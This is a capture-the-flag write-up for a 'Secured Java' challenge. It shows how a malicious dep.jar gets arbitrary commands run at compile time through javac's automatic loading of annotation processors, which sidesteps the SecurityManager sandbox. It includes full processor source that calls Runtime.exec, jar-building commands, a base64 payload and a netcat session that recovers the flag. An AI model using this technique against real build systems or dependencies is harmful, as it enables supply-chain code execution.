# Secured Java

The challenge is [a single python file](./secured_java.py) that allows you to run Java in a "secure way".

The code boils down to:
1. you upload two files: `Main.java` and `dep.jar`
2. it compile Main
3. it runs Main with an empty _security policy_

Pseudocode:

```python
get_file("Main.java")
get_file("dep.jar")

subprocess.run(
    ["javac", "-cp", DEP_FILE, SOURCE_FILE],
    check=True,
)

subprocess.run(["java", "--version"])
subprocess.run(
    [
        "java",
        "-cp", f".:{DEP_FILE}",
        "-Djava.security.manager",
        "-Djava.security.policy==/dev/null",
        "Main",
    ],
    check=True,
)
```

Obviously running arbitrary Java code is dangerous, but because we are running it with a _SecurityManager_ and not explicitly granting permissions (e.g. "`grant { permission java.net.SocketPermission "localhost:1337", "listen" }`") then the attacker code will need to bypass the sandbox to run dangerous operations, e.g. cat'ing the flag.

Now, escaping the SecurityManager [is](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4681) [not](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0422) [unheard of](https://github.com/codeplutos/java-security-manager-bypass), but was mostly an issue when "Java Applets" ran in everyones browser.

While SecurityManager is [rarely used today](https://openjdk.java.net/jeps/411) there exists no publicly known bypasses.

So can we avoid having to bypass the sandbox?
Can we run code during compiling (which is not sandboxed)? I.e. during `javac -cp dep.jar Main.java`?

While I was looking into trying to override any internal classes used by `javac` during compilation a kalmarunionen teammate found something that looked very promissing: "_annotation processor_".

Annotation processors are used during compilation to turn `@whatever` into e.g. new source files/documentation/etc.
To specify new annotations you can run `javac -processor com.example.MyProcessor Main.java`, but `javac` will also automatically pick up all processors specified in `META-INF/services/javax.annotation.processing.Processor` of all jars in the classpath!

So the exploit plan is to generate a `dep.jar` which specifies an annotation processor which prints the flag.

## Crafting the exploit

**`dep.jar`**

Creating a minimal annotation processor (`MyProcessor.java`):

```java
package dk.kalmar;
import java.util.*;
import javax.lang.model.*;
import javax.lang.model.element.*;
import javax.annotation.processing.*;

public class MyProcessor extends AbstractProcessor {
    public static void execCmd(String cmd) throws Exception {
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
        System.out.println(cmd + "=> " + (s.hasNext() ? s.next() : ""));
    }

    static {
        try {
            execCmd("cat /flag");
            System.out.println("IT WORKS");
        } catch (Exception e) {
            System.out.println("Err: " + e.getMessage());
        }
   }

    // These methods needs to be defined, but doesn't matter
    // as the above static block will run before anything else
    @Override
    public synchronized void init(ProcessingEnvironment env) { }
    @Override
    public boolean process(Set<? extends TypeElement> annoations, RoundEnvironment env) { return false; }
    @Override
    public Set<String> getSupportedAnnotationTypes() { return null; }
    @Override
    public SourceVersion getSupportedSourceVersion() { return null; }
}
```

Then `javac MyProcessor.java` and create the `dep.jar`:

```sh
mkdir -p META-INF/services/ dk/kalmar/

mv MyProcessor.class dk/kalmar/MyProcessor.class
echo "dk.kalmar.MyProcessor" > META-INF/services/javax.annotation.processing.Processor

jar cvf dep.jar ./
base64 dep.jar | tr -d '\n'
```

**`Main.java`**

```sh
echo "" | base64  # yep, empty!
```

## Payload

```
$ nc 139.224.248.65 1337
Welcome to the secured Java sandbox.
Please send me the file Main.java.
Content: (base64 encoded) Cg==
Please send me the file dep.jar.
Content: (base64 encoded) UEsDBBQACAgIAM28N1QAAAAAAAAAAAAAAAAJAAQATUVUQS1JTkYv/soAAAMAUEsHCAAAAAACAAAAAAAAAFBLAwQUAAgICADNvDdUAAAAAAAAAAAAAAAAFAAAAE1FVEEtSU5GL01BTklGRVNULk1G803My0xLLS7RDUstKs7Mz7NSMNQz4OVyLkpNLElN0XWqBAoARfQMjRU0QpNK80pKNXm5eLkAUEsHCFqUmu82AAAANwAAAFBLAwQKAAAIAADMvDdUAAAAAAAAAAAAAAAAEgAAAE1FVEEtSU5GL3NlcnZpY2VzL1BLAwQUAAgICADMvDdUAAAAAAAAAAAAAAAANwAAAE1FVEEtSU5GL3NlcnZpY2VzL2phdmF4LmFubm90YXRpb24ucHJvY2Vzc2luZy5Qcm9jZXNzb3JLydbLTszJTSzS860MKMpPTi0uzi/iAgBQSwcIXWwx8BgAAAAWAAAAUEsDBAoAAAgAALK8N1QAAAAAAAAAAAAAAAADAAAAZGsvUEsDBAoAAAgAAMq8N1QAAAAAAAAAAAAAAAAKAAAAZGsva2FsbWFyL1BLAwQUAAgICADKvDdUAAAAAAAAAAAAAAAAGwAAAGRrL2thbG1hci9NeVByb2Nlc3Nvci5jbGFzc51V61YTVxT+TgKZZBxuAcpFpVRBuVSmrVatQSpGqNSAlFCsl14OyTEMmcykMycseIC+Q/sE/umP2h/RRdfqA/Sh1H0mk5jESLvKYp05Z599+fa399n559Xx3wCuQeoYwScaPtXxGS6r5YqOz3FVRwTX4riuvl8kcAMptVtUy804lpJkfFvHJNJx3NHxAVbiWI3jKw13dQxiLQmGexoyGtYZYouWY8klhujM7A5DV9rNC4a+jOWIjUppV3jbfNcmiSYORS5dyjMMz2T2+QE3be4UzKz0LKeQUqY9WclzxXVeDiw0bGi4z6CvHOZEWVqu45N3FYvhas3Dockdx5VcXZplz80J3ydn5mZju+IcWJ7rlIQjgxBaqMVwKwRRkZZtZoVMnehxy604+RZnjxgSWavgcFnxKDurzd3ifOgvSLJEnNimsIWyNbePymKltk8t/Y+4pwtCZivlsutJkV9u2Cm3lNjAzGxbZgzT7bLFdyuwRHpjzZ6zbsXLiR3h+eSc4VzooyWlFh1yEF/M2WE76LW7VUsVv3/9KCyK6y0oLwZGMUZgm1DliALhadg08A22DGSxreFbAzt4oLS/Y4g8WTbwEI80PDbwBN8b+AE/GvgJnIFasv+260pfery8LuSem/f7YtiNI2cgD2HgKc5SzXJcTppPbV4wcEYJehqCBXlIrZUwPcHz6sww+JakRhMaKIDHsaecWtTL+aJZ5HaJe2ZTigyXTqrq8q5CmZNN+v3t9ahHt1xqZ8uRJBW8VGcsUNyqONIqEbs6la1xGK7XulmHStOl3h/DxU6Pr0kUYkq1RNqsv5peirTmlCsNOCP1aISz6YLMR2c6XqhXaFR8cUfYVsmSwjsRUnNnpFpZOvKlIABRt0JVG850IIsMtD3ubwhVV5pO9HS6nOAw1MJRGFLHPooM3ezm0iSjzEq8KNKuQ/3xwJJ7tPMldySRcL0D3pNJDUXB/CF4tlOr2TpxygtUs9iK591QQS/8S3VCkQZb9V+ZYertneUcuEURqtSAr1KTud6RBmI5lnHdYoVMjDXFZtrmvq/mxa/NIUMftfdzlzt5W/hTNcMOKb7PUE2iDuqPm0T3d/dFTrbkFrpIc9vOUmNQkoRu+j9hY5g4WQ8f0a/YCNSfRpOCZg+t43Q6S18aHuieewH2HGqMnKY1Fgg1JNSQoF9FpfoLumgHXPkLkYcvEZ2roquK7heIJbUq4pk/kZibr0L/DTp9Tj1Dd9I4Rg9QRa/yHAk89yJKa4LA6LiMU5ig0zwirzGLiIYPNVKj7yRtXxOGuihaE9E/ZQICQuOBdudwPsxjLAiAd3MYpXUK02EO43RS8SPR39v0xnEhcHGRTjMKTENf3UbYH236Z0L9OTrN4+MQxvv1JxDHpQbte2SppOeTfS/RnxxQS5KWZxi8p3isYugYwyF1SrEPScq4RuEEFUZJutFPJA7Qbohu1f0gMTIcUEqkbWkY7KNsFwKcJlz66uSshJ/hEJIvg2pEcItky8H69RtQSwcIFIlfa2wEAAA5CQAAUEsBAhQAFAAICAgAzbw3VAAAAAACAAAAAAAAAAkABAAAAAAAAAAAAAAAAAAAAE1FVEEtSU5GL/7KAABQSwECFAAUAAgICADNvDdUWpSa7zYAAAA3AAAAFAAAAAAAAAAAAAAAAAA9AAAATUVUQS1JTkYvTUFOSUZFU1QuTUZQSwECCgAKAAAIAADMvDdUAAAAAAAAAAAAAAAAEgAAAAAAAAAAAAAAAAC1AAAATUVUQS1JTkYvc2VydmljZXMvUEsBAhQAFAAICAgAzLw3VF1sMfAYAAAAFgAAADcAAAAAAAAAAAAAAAAA5QAAAE1FVEEtSU5GL3NlcnZpY2VzL2phdmF4LmFubm90YXRpb24ucHJvY2Vzc2luZy5Qcm9jZXNzb3JQSwECCgAKAAAIAACyvDdUAAAAAAAAAAAAAAAAAwAAAAAAAAAAAAAAAABiAQAAZGsvUEsBAgoACgAACAAAyrw3VAAAAAAAAAAAAAAAAAoAAAAAAAAAAAAAAAAAgwEAAGRrL2thbG1hci9QSwECFAAUAAgICADKvDdUFIlfa2wEAAA5CQAAGwAAAAAAAAAAAAAAAACrAQAAZGsva2FsbWFyL015UHJvY2Vzc29yLmNsYXNzUEsFBgAAAAAHAAcA1AEAAGAGAAAAAA==
cat /flag=> rwctf{818dd1e92a56d1badd5234367d15d563}

An annotation processor threw an uncaught exception.
Consult the following stack trace for details.
java.lang.NullPointerException: Cannot invoke "javax.lang.model.SourceVersion.compareTo(java.lang.Enum)" because "procSourceVersion" is null
	at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment$ProcessorState.checkSourceVersionCompatibility(JavacProcessingEnvironment.java:765)
	at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment$ProcessorState.<init>(JavacProcessingEnvironment.java:704)
	at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment$DiscoveredProcessors$ProcessorStateIterator.next(JavacProcessingEnvironment.java:829)
	at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment.discoverAndRunProcs(JavacProcessingEnvironment.java:925)
	at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment$Round.run(JavacProcessingEnvironment.java:1269)
	at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment.doProcessing(JavacProcessingEnvironment.java:1384)
	at jdk.compiler/com.sun.tools.javac.main.JavaCompiler.processAnnotations(JavaCompiler.java:1261)
	at jdk.compiler/com.sun.tools.javac.main.JavaCompiler.compile(JavaCompiler.java:935)
	at jdk.compiler/com.sun.tools.javac.main.Main.compile(Main.java:317)
	at jdk.compiler/com.sun.tools.javac.main.Main.compile(Main.java:176)
	at jdk.compiler/com.sun.tools.javac.Main.compile(Main.java:64)
	at jdk.compiler/com.sun.tools.javac.Main.main(Main.java:50)
Compiling...
Failed to compile!
```

Flag: `rwctf{818dd1e92a56d1badd5234367d15d563}`
